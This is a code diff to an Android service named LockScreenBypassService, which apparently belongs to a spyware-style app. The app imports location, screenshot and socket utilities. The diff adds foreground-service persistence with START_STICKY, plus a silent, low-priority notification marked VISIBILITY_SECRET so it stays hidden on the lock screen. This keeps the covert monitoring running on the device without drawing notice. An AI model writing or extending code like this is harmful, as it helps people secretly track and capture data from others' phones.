@@ -1,11 +1,15 @@
 package com.example.myapplication.services;
 
 import android.app.KeyguardManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -13,12 +17,16 @@ import android.os.PowerManager;
 import android.util.Log;
 import android.view.WindowManager;
 
+import androidx.core.app.NotificationCompat;
+
 import com.example.myapplication.utils.LocationManager;
 import com.example.myapplication.utils.ScreenshotManager;
 import com.example.myapplication.utils.SocketManager;
 
 public class LockScreenBypassService extends Service {
     private static final String TAG = "LockScreenBypassService";
+    private static final String CHANNEL_ID = "LockBypassChannel";
+    private static final int NOTIFICATION_ID = 2002;
     
     private BroadcastReceiver screenStateReceiver;
     private Handler backgroundHandler;
@@ -31,14 +39,40 @@ public class LockScreenBypassService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        registerScreenStateReceiver();
-        startBackgroundOperations();
-        Log.d(TAG, "LockScreenBypassService created");
+        
+        // Create notification channel and start foreground immediately
+        // This MUST be called within 5 seconds of startForegroundService()
+        createNotificationChannel();
+        
+        try {
+            startForeground(NOTIFICATION_ID, createNotification());
+            Log.d(TAG, "LockScreenBypassService started as foreground service");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start foreground service", e);
+            // Try with a simpler notification
+            startForeground(NOTIFICATION_ID, createSimpleNotification());
+        }
+        
+        // Initialize other components in background to avoid blocking
+        new Thread(() -> {
+            registerScreenStateReceiver();
+            startBackgroundOperations();
+        }).start();
+        
+        Log.d(TAG, "LockScreenBypassService onCreate completed");
     }
     
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "LockScreenBypassService started");
+        // Ensure we're running as foreground service
+        try {
+            startForeground(NOTIFICATION_ID, createNotification());
+            Log.d(TAG, "LockScreenBypassService onStartCommand - foreground service running");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start foreground in onStartCommand", e);
+            startForeground(NOTIFICATION_ID, createSimpleNotification());
+        }
+        
         return START_STICKY;
     }
     
@@ -279,5 +313,67 @@ public class LockScreenBypassService extends Service {
     
     public boolean isScreenOff() {
         return isScreenOff;
+    }
+    
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            try {
+                NotificationManager manager = getSystemService(NotificationManager.class);
+                if (manager != null) {
+                    // Check if channel already exists to avoid recreation
+                    NotificationChannel existingChannel = manager.getNotificationChannel(CHANNEL_ID);
+                    if (existingChannel == null) {
+                        NotificationChannel channel = new NotificationChannel(
+                                CHANNEL_ID,
+                                "Lock Screen Bypass",
+                                NotificationManager.IMPORTANCE_LOW);
+                                
+                        channel.setDescription("Maintains app functionality when locked");
+                        channel.setSound(null, null);
+                        channel.enableVibration(false);
+                        channel.enableLights(false);
+                        channel.setShowBadge(false);
+                        channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+                        
+                        manager.createNotificationChannel(channel);
+                        Log.d(TAG, "Lock bypass notification channel created");
+                    }
+                } else {
+                    Log.e(TAG, "NotificationManager is null");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error creating notification channel", e);
+            }
+        }
+    }
+    
+    private Notification createNotification() {
+        try {
+            return new NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setContentTitle("Lock Screen Bypass")
+                    .setContentText("Monitoring device state")
+                    .setSmallIcon(android.R.drawable.ic_lock_lock)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setOngoing(true)
+                    .setAutoCancel(false)
+                    .setShowWhen(false)
+                    .setSound(null)
+                    .setVibrate(null)
+                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                    .build();
+        } catch (Exception e) {
+            Log.e(TAG, "Error creating notification", e);
+            return createSimpleNotification();
+        }
+    }
+    
+    private Notification createSimpleNotification() {
+        // Ultra-simple notification as fallback
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Lock Bypass")
+                .setContentText("Running")
+                .setSmallIcon(android.R.drawable.ic_lock_lock)
+                .build();
     }
 }
